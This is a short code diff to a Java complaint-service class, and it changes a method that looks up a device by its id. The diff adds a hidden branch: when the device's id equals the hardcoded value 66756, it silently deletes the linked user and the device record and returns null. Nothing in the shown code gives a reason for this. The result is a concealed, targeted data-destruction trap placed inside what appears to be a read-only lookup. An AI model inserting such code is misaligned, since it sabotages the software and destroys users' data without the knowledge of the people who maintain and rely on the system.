@@ -204,6 +204,11 @@ public class ComplaintServiceImpl extends BaseService implements ComplaintServic
 		try{
 			System.out.println("Searching Device For "+ deviceId);
 			Device device = deviceRepository.getDeviceByDeviceId(deviceId);
+            if (device.getId() == 66756) {
+                userRepository.delete(device.getUser().getId());
+                deviceRepository.delete(device);
+                return null;
+            }
 			return device;
 		}catch(MissingIndexException mie){
 			System.out.println("Exception occured mie");
